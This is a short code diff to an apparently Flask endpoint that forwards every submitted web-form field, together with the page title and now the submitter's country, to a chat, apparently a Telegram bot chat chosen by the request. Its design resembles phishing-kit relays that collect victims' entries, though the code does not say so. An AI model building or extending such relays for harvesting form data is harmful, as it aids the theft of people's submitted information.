@@ -21,19 +21,22 @@ def submit():
         chat_id = data.get("chat_id")
         form_data = data.get("form_data", {})
         page_title = data.get("pageTitle") or "No Title"
+        country = data.get("country", "Unknown")  # ✅ added
     else:
         bot_token = request.form.get("bot_token", BOT_TOKEN)
         chat_id = request.form.get("chat_id")
         form_data = dict(request.form)
         page_title = request.form.get("pageTitle") or "No Title"
+        country = request.form.get("country", "Unknown")  # ✅ added
 
     if not chat_id:
         return jsonify({"status": "error", "details": "chat_id is required"}), 400
 
     # Compose text message
-    msg = f"📄 Page: {page_title}\n\n"
+    msg = f"📄 Page: {page_title}\n"
+    msg += f"🌍 Country: {country}\n\n"  # ✅ added
     for k, v in form_data.items():
-        if k not in ["bot_token", "chat_id", "pageTitle"]:
+        if k not in ["bot_token", "chat_id", "pageTitle", "country"]:
             msg += f"{k}: {v}\n"
 
     # Send text message
